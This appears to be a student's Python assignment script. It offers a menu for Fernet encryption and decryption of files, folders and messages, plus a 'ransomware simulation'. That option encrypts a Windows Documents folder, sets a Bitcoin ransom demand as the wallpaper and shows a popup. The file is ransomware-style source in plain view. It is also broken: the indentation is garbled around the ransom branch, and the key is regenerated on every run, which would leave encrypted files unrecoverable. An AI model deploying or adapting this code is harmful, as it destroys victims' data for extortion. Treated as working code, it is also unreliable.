#!/usr/bin/env python3
#Script: Ops 401 Class 07 Ops Challenge Solution
# Author: Dericus Horner
# Date of latest revision:04/25/2023
# Assistance from Chat GPT

# Main

import os
import ctypes
from cryptography.fernet import Fernet

def write_key():
    with open("key.key", "wb") as key_file:
        key_file.write(Fernet.generate_key())

def load_key():
    return open("key.key", "rb").read()

def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        encrypted_data = Fernet(key).encrypt(file.read())
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def decrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        decrypted_data = Fernet(key).decrypt(file.read())
    with open(file_path, "wb") as file:
        file.write(decrypted_data)

def encrypt_folder(folder_path, key):
    for dirpath, dirnames, filenames in os.walk(folder_path):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            encrypt_file(file_path, key)

def decrypt_folder(folder_path, key):
    for dirpath, dirnames, filenames in os.walk(folder_path):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            decrypt_file(file_path, key)

def encrypt_message(message, key):
    encrypted = Fernet(key).encrypt(message.encode('utf-8'))
    print("The encrypted message is:", encrypted.decode('utf-8'))

def decrypt_message(encrypted_message, key):
    decrypted = Fernet(key).decrypt(encrypted_message.encode('utf-8'))
    print("The decrypted message is:", decrypted.decode('utf-8'))

def change_wallpaper(message):
    # Change the desktop wallpaper to the ransomware message
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, message, 0)

def show_popup(message):
    # Create a pop-up window with the ransomware message
    ctypes.windll.user32.MessageBoxW(None, message, "Ransomware", 0x40)

write_key()


while True:
    method_choice = input("Pick one of the following choices:\n1. Encrypt file\n2. Decrypt file\n3. Encrypt message\n4. Decrypt message\n5. Encrypt folder\n6. Decrypt folder\n7. Ransomware simulation\n8. Exit\n")
    if method_choice == "1":
        file_path = input("Please type the file path you'd like to encrypt: ")
        encrypt_file(file_path, load_key())
        print("Your file has been encrypted")
    elif method_choice == "2":
        file_path = input("The file path you'd like to decrypt: ")
        decrypt_file(file_path, load_key())
        print("Your file has been decrypted")
    elif method_choice == "3":
        message = input("The message you'd like to encrypt: ")
        encrypt_message(message, load_key())
    elif method_choice == "4":
        encrypted_message = input("The message you'd like to decrypt: ")
        decrypt_message(encrypted_message, load_key())
    elif method_choice == "5":
        folder_path = input("Please type the folder path you'd like to encrypt: ")
        encrypt_folder(folder_path, load_key())
        print("Your folder has been encrypted")
    elif method_choice == "6":
        folder_path = input("The folder path you'd like to decrypt: ")
        decrypt_folder(folder_path, load_key())
    elif method_choice == "7":
        message = "Your files have been encrypted. Pay $1000 in Bitcoin to get the decryption key."
    key = load_key()
    encrypt_folder("C:\\Users\\<username>\\Documents\\", key)
    change_wallpaper(message)
    show_popup(message)

    elif method_choice == "8":
    break

else:
    print("Choose is invalid. Please try again.")
